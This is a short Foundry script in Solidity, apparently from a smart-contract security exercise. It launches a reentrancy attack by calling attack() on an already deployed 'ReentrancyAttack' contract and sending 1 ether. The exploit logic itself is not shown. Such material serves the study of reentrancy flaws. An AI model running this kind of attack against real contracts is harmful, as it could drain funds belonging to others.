// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IAttack {
    function attack() external payable;
}

/// @title Attack
/// @notice Calls the attack() function on the deployed ReentrancyAttack contract
contract Attack is Script {
    function run() external {
        address attackContract = vm.envAddress("ATTACK_CONTRACT_ADDRESS");

        vm.startBroadcast();
        IAttack(attackContract).attack{value: 1 ether}();
        vm.stopBroadcast();
    }
}
